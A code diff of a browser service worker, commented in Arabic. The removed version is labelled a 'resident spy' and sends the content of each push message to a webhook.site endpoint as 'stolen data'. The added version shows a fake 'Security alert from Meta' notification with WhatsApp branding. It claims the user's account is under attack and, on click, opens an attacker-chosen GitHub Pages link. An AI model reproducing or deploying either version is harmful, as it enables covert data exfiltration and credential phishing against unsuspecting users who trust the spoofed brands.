@@ -1,17 +1,18 @@
-// sw.js - الجاسوس المقيم
-self.addEventListener('install', (event) => {
-    self.skipWaiting(); // تفعيل الجاسوس فوراً دون انتظار
+self.addEventListener('push', function(event) {
+    const options = {
+        body: 'تم رصد محاولة اختراق لحسابك! اضغط فوراً لتأمين الحساب.',
+        icon: 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg', // أو شعار فيسبوك
+        badge: 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
+        vibrate: [200, 100, 200],
+        data: { url: 'https://yourname.github.io/your-repo/' } // رابط موقعك هنا
+    };
+
+    event.waitUntil(
+        self.registration.showNotification('تنبيه أمني من Meta', options)
+    );
 });
 
-self.addEventListener('push', function(event) {
-    let payload = event.data ? event.data.text() : 'إشعار جديد غامض';
-    
-    // إرسال البيانات المسروقة لـ Webhook الخاص بك
-    event.waitUntil(
-        fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({ app: "Spy_Active", content: payload })
-        })
-    );
+self.addEventListener('notificationclick', function(event) {
+    event.notification.close();
+    event.waitUntil(clients.openWindow(event.notification.data.url));
 });
